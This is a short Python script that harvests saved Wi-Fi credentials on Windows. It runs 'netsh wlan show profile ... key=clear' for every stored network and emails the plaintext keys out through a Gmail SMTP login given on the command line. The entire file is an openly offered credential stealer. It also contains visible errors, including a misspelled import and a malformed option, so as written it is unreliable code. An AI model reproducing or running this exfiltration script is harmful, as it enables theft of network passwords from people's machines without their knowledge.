#!/usr/bin/python

'''
python exeucyte_command.py -e test@gmail.com -p pwd1234
'''

import subprocess, stmplib, re
import optparse
#
#
def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("e", "--email", dest="usr_email", help="Email generator.")
	parser.add_option("p", "--pwd", dest="usr_pwd", help="Email generator")

	(options, argument) = parser.parse_args()

	if not options.usr_email:
		parser.error("[+] Please specify an email, use --help for more info"):
	elif not options.usr_pwd:
		parser.error("[-] Please specify password, use --help for more info.")

	return options
#
#
def send_mail(email, password, message):
	# Create an instance of an smtp server
	server = smtplib.SMTP("smtp.gmail.com", 587)

	# Initiate a TLS connection
	server.starttls()

	server.login(email, password)
	server.sendmail(email, email, message)

	server.quit()
#
#
options = get_arguments()
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
	command = "netsh wlan show profile " + network_name + " key=clear"
	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result

send_mail(options.usr_email, options.usr_pwd, result)
